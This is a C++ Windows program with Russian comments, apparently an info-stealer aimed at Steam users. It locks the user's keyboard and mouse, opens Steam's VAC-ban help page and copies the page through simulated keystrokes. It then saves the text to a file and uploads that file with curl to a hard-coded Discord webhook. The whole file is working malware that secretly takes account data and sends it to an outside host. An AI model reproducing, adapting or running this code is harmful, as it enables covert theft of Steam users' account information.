#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

// Функция для блокировки ввода с клавиатуры и мыши
void BlockInput(bool block) {
    BlockInput(block ? TRUE : FALSE);
}

// Функция для перемещения курсора
void SetMousePosition(int x, int y) {
    SetCursorPos(x, y);
}

// Функция для симуляции нажатия клавиши
void SendKey(WORD key, bool keyDown) {
    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = key;

    if (keyDown) {
        SendInput(1, &input, sizeof(INPUT));  // Нажимаем клавишу
    }
    else {
        input.ki.dwFlags = KEYEVENTF_KEYUP;  // Отпускаем клавишу
        SendInput(1, &input, sizeof(INPUT));  // Отпускаем клавишу
    }
}

// Функция для открытия страницы в Steam
void OpenSteamPage(const std::string& url) {
    std::string command = "start steam://openurl/" + url;
    system(command.c_str());
}

// Функция для имитации клика левой кнопкой мыши
void ClickLeftMouseButton() {
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
}

// Функция для записи содержимого буфера обмена в файл
void SaveClipboardToFile(const std::string& filename) {
    if (OpenClipboard(nullptr)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData != nullptr) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText != nullptr) {
                std::ofstream outFile(filename, std::ios::out | std::ios::trunc);
                if (outFile.is_open()) {
                    outFile << pszText;
                    outFile.close();
                    std::cout << "Текст успешно записан в файл " << filename << "\n";
                }
                else {
                    std::cerr << "Не удалось открыть файл для записи.\n";
                }
                GlobalUnlock(hData);
            }
            else {
                std::cerr << "Не удалось получить текст из буфера обмена.\n";
            }
        }
        else {
            std::cerr << "Буфер обмена не содержит текст.\n";
        }
        CloseClipboard();
    }
    else {
        std::cerr << "Не удалось открыть буфер обмена.\n";
    }
}

// Функция для поиска окна Steam
HWND FindSteamWindow() {
    return FindWindow(NULL, L"Steam");
}

// Функция для развертывания окна Steam на весь экран
void MaximizeSteamWindow(HWND hwnd) {
    if (hwnd != NULL) {
        // Восстанавливаем окно, если оно свернуто
        ShowWindow(hwnd, SW_RESTORE);

        // Получаем размеры экрана
        RECT screenRect;
        SystemParametersInfo(SPI_GETWORKAREA, 0, &screenRect, 0);

        // Растягиваем окно на весь экран
        MoveWindow(hwnd, screenRect.left, screenRect.top, screenRect.right - screenRect.left, screenRect.bottom - screenRect.top, TRUE);
        std::cout << "Окно Steam развернуто на весь экран." << std::endl;

        // Делаем окно активным и передним
        SetForegroundWindow(hwnd);
        std::cout << "Окно Steam теперь на переднем плане." << std::endl;
    }
    else {
        std::cout << "Steam не найден." << std::endl;
    }
}

// Функция для перемещения курсора в центр окна
void MoveCursorToCenter(HWND hwnd) {
    if (hwnd != NULL) {
        RECT rect;
        if (GetWindowRect(hwnd, &rect)) {
            // Вычисляем центр окна
            int centerX = rect.left + (rect.right - rect.left) / 6;
            int centerY = rect.top + (rect.bottom - rect.top) / 2;

            // Перемещаем курсор в центр окна
            SetCursorPos(centerX, centerY);
            std::cout << "Курсор перемещен в центр окна." << std::endl;
        }
    }
}

int main() {
    BlockInput(true);

    // Шаг 1: Находим окно Steam
    HWND hwnd = FindSteamWindow();

    // Шаг 2: Разворачиваем окно Steam на весь экран и ставим его на передний план
    MaximizeSteamWindow(hwnd);

    // Шаг 3: Открываем Steam URL
    OpenSteamPage("https://help.steampowered.com/cs/wizard/VacBans");

    // Задержка для открытия страницы
    std::this_thread::sleep_for(std::chrono::milliseconds(5500));
    ClickLeftMouseButton();

    // Шаг 4: Перемещаем курсор в центр окна Steam
    MoveCursorToCenter(hwnd);

    SendKey(VK_CONTROL, true);
    SendKey(0x41, true);
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    SendKey(0x41, false);
    SendKey(VK_CONTROL, false);

    SendKey(VK_CONTROL, true);
    SendKey(0x43, true);
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    SendKey(0x43, false);
    SendKey(VK_CONTROL, false);

    SaveClipboardToFile("C:\\output.txt");

    // Задержка перед отправкой файла и разблокировкой ввода
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    // Отправка файла через curl
    system("curl -X POST https://discord.com/api/webhooks/1308891725338640425/5pnnK2W7xVoqEEdRoUws8M57s0bhNAOH5q8yVIJHz8i3Ubg1LMdq6DJpzAVT-G4umb4b -F \"file=@C:\\output.txt\"");

    // Разблокировка ввода
    BlockInput(false);

    std::cout << "Курсор перемещен, страница открыта, контент скопирован, файл отправлен и ввод разблокирован!" << std::endl;

    return 0;
}
